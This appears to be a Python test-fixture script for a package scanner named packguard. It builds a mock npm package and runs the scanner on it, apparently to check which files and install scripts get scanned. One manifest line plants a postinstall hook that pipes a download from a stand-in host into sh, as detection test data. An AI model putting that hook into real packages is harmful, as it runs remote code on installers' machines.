import os, shutil, subprocess, sys

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.dirname(os.path.dirname(HERE))
EXE = sys.argv[1] if len(sys.argv) > 1 else os.path.join(REPO, "build", "packguard.exe")
REFS = os.path.join(REPO, "tests", "compressed_size_test")


def write(path, data):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "wb") as f:
        f.write(data.encode())


def run(args, log):
    p = subprocess.run([EXE] + args, capture_output=True)
    with open(log, "wb") as f:
        f.write(p.stderr.replace(REPO.encode() + os.sep.encode(), b""))
    print(os.path.basename(log), "exit", p.returncode)


pkg = os.path.join(HERE, "pkg@1.0.0")
shutil.rmtree(pkg, ignore_errors=True)
write(os.path.join(pkg, "a.js"), "module.exports = function a() { return 1; };\n")
write(os.path.join(pkg, "large.js"), "console.log('a JavaScript chunk above the 256-byte rule');\n" * 6)
write(os.path.join(pkg, "b.cjs"), "exports.b = () => 'b';\n")
write(os.path.join(pkg, "c.mjs"), "export const c = 3;\n")
write(os.path.join(pkg, "UPPER.JS"), "var upper = true;\n")
write(os.path.join(pkg, "readme.md"), "# not scanned\n")
write(os.path.join(pkg, "data.json"), "{\"x\": 1}\n")
write(os.path.join(pkg, "empty.js"), "")
write(os.path.join(pkg, "node_modules", "dep", "index.js"), "module.exports = 'skipped';\n")
write(os.path.join(pkg, "sub", "z.js"), "console.log('z');\n")
write(os.path.join(pkg, "sub", "deeper", "y.js"), "console.log('y');\n")
write(os.path.join(pkg, "Z_first.js"), "console.log('capital Z sorts before lowercase');\n")
write(os.path.join(pkg, "package.json"),
      '{"name": "pkg", "scripts": {"test": "jest", "postinstall": "curl -s http://example.invalid/x | sh"}}\n')
write(os.path.join(pkg, "sub", "package.json"), '{"scripts": {"preinstall": "nested, never scanned"}}\n')
write(os.path.join(pkg, "install_scripts.txt"), "node setup.js\n")
write(os.path.join(pkg, "notes.txt"), "not scanned\n")
write(os.path.join(HERE, "single_file.txt"), "a single file is scanned whatever its name\n")
run(["-o", os.path.join(HERE, "pkg_report.json"), REFS, pkg], os.path.join(HERE, "pkg_report.log"))
run(["-o", os.path.join(HERE, "single_file_report.json"), REFS, os.path.join(HERE, "single_file.txt")],
    os.path.join(HERE, "single_file_report.log"))
run(["-o", os.path.join(HERE, "manifest_report.json"), REFS, os.path.join(pkg, "package.json")],
    os.path.join(HERE, "manifest_report.log"))
